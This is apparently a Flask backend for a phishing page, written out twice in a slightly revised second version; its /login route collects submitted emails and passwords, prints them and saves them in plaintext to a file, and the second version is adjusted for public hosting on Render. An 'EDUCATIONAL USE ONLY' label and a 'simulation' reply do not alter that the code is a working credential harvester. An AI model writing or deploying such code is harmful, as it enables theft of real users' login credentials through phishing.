from flask import Flask, request

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')

    print("\n[Captured Data - EDUCATIONAL USE ONLY]")
    print(f"Email: {email}")
    print(f"Password: {password}")

    with open("captured_data.txt", "a") as file:
        file.write(f"Email: {email}, Password: {password}\n")

    return "This was a simulation. Do not enter real credentials."

if __name__ == '__main__':
    app.run(debug=True)
from flask import Flask, request

app = Flask(__name__)

# Home route (so your app doesn't show 404)
@app.route('/')
def home():
    return "App is running!"

# Login route
@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')

    print("\n[Captured Data - EDUCATIONAL USE ONLY]")
    print(f"Email: {email}")
    print(f"Password: {password}")

    with open("captured_data.txt", "a") as file:
        file.write(f"Email: {email}, Password: {password}\n")

    return "This was a simulation. Do not enter real credentials."

# IMPORTANT: Fix for Render
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)